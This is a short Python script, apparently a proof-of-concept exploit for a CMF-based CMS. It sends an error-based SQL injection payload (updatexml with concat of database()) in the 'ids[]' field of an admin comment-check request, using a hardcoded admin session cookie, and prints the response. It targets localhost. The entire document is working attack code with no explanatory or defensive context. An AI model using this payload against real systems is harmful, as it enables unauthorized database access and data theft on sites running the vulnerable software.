import requests

if __name__ == '__main__':
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/66.0.3359.181 Safari/537.36',
        'Cookie': "thinkphp_show_page_trace=0|0; Q4GhfC_admin_username=admin; Q4GhfC_think_language=zh-CN; "
                  "PHPSESSID=8msbf25u151i7oo784ra90js29",
    }
    url = "http://127.0.0.1/cmfx/index.php?g=Comment&m=commentadmin&a=check&check=1"
    session = requests.Session()
    d = {"ids[]": "1", "ids[]": '2 and updatexml(1,concat(0x7e,(database()),0x7e),1)'}
    response = session.post(url=url, headers=headers, data=d)
    print(response.status_code)
    print(response.text)
